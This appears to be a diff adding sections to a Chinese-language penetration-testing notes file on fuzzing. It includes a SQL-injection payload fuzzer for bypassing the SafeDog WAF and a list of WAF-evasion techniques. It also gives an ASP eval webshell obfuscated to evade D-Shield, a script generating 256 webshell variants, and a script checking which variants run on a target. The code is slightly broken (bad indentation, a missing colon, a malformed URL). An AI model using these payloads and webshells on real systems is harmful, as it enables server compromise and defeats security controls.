@@ -3454,3 +3454,141 @@ headers = {
 ```
 
 </details>
+
+<details>
+<summary>绕过安全狗优化_参数值和ua值</summary>
+
+```
+----------------------------------------------------------------------------
+from fake_useragent import UserAgent
+
+def fuzzexp(url):
+    fuzzing_x = ['/*', '*/', '*!', '*', '=', '`', '!', '@', '%', '.', '-', '+', '|', '%00']
+    fuzzing_y = ['', ' ']
+    fuzzing_z = ["%0a", "%0b", "%0c", "%0d", "%0e", "%0f", "%0g", "%0h", "%0j"]
+    fuzz = fuzzing_x + fuzzing_y + fuzzing_z
+ua = UserAgent()
+headers = ua.firefox
+    for a in fuzz:
+        for b in fuzz:
+            for c in fuzz:
+                for d in fuzz:
+                    exp = "/*!" + a + b + c + d + "and*/'a'='a--+" ##被双引号或单引号包起来 就是一串字符，特殊字符就没法被解析
+----------------------------------------------------------------------------
+绕过安全狗有四种
+[1]利用string的绕过
+C语言在使用string等结构存储请求时，当进行解码时，%00会被识别替换为NULL,这样便导致了请求包的内容会被在构造后截断
+str = 1%00%20and%20a=a  --> str = 1
+
+[2]利用user-agent绕过
+在WAF应用程序进行防护的时候，一部分防护厂商会对某些user-agent进行特殊放行，例如百度爬虫的user-agent
+
+[3]利用MySQL语法和HTML的特殊性绕过
+“/*”和“*/”中间的内容将会被视为注释而不进行操作
+例如”9.0union" 参数为浮点时语句结束，被当作空格执行
+url编码后%20表示空格
+
+[4]畸形数据包绕过
+利用Apache对于HTTP数据包的兼容性 以及 对防护软件的不兼容性 绕过WAF
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>模糊测试结合WebShell</summary>
+
+```
+----------------------------------------------------------------------------
+#免杀绕过D盾
+<%
+a = request("value")
+eval + a
+%>
+#主要思路是将WebShell和参数传递变形实现免杀
+----------------------------------------------------------------------------
+#！/usr/bin/env python
+# coding:utf-8
+import os
+
+def generate(count):
+    template = """
+<%
+a = request("value")
+eval{0}a
+%>""".format(chr(count))
+    with open(os.path.join(path, "fuzz_{}.app".format(count)), 'w') as f:
+        f.write(template)
+
+#循环调用方法，遍历0~255的ASCII码，
+path = r"./fuzz/"
+
+for c in range(0, 256):
+    generate(c)
+----------------------------------------------------------------------------
+#批量访问查看接口的脚本
+import requests
+
+for i in range(32,128):
+    url = 'http://IP/1/fuzz_{0}.asp'.format(i)
+    body_post = {'value': 'value=response.write("attack")'}
+    r = requests.post(url, data=body_post)
+    content = r.text
+    if 'attack' in content
+        print(url)
+        print(content)
+# 页面返回带有attack,则代表WebShell是可用的
+
+# eval{0}a是属于固定点位的测试
+# 另外一种有效的方法，不设置固定的fuzz插入位置，让让遍历所有位置生成模糊测试的WebShell
+----------------------------------------------------------------------------
+```
+
+</details>
+
+<details>
+<summary>更多</summary>
+
+```
+----------------------------------------------------------------------------
+XSS模糊测试工具XSStrike
+~ git clone https://github.com/s0md3v/XSStrike.git
+----------------------------------------------------------------------------
+Sulley模糊测试框架
+1.安装MinGW
+
+2.~ git clone https://github.com/Fitblip/pydbg.git
+
+3.
+>>> python setup.py install
+>>> python setup.py build_ext -c mingw32
+>>> python setup.py install
+
+4.
+~ git clone https://github.com/OpenRCE/sulley.git
+>>> python process_monitor.py
+
+5.
+>>> git clone https://github.com/CoreSecurity/pcapy.git
+http://www.winpcap.org/install/bin/WpdPack_4_1_2.zip
+
+>>> python setup.py build_ext -c mingw32 -I "C:\sulley\WpdPack\Include" -L "C:\sulley\WpdPack\Lib"
+>>> python  setup.py install
+
+6.安装PWinPcap
+7. git clone https://github.com.CoreSerurity/impacket.git
+>>>python setup.py install
+
+运行
+>>> python network_monitor.py
+----------------------------------------------------------------------------
+模糊测试的 防御策略
+
+1.限制某项功能的试错和频率
+2.通过统一的返回值或信息返回 误导攻击者
+----------------------------------------------------------------------------
+```
+
+</details>
+
+----------------------------------------------------------------------------
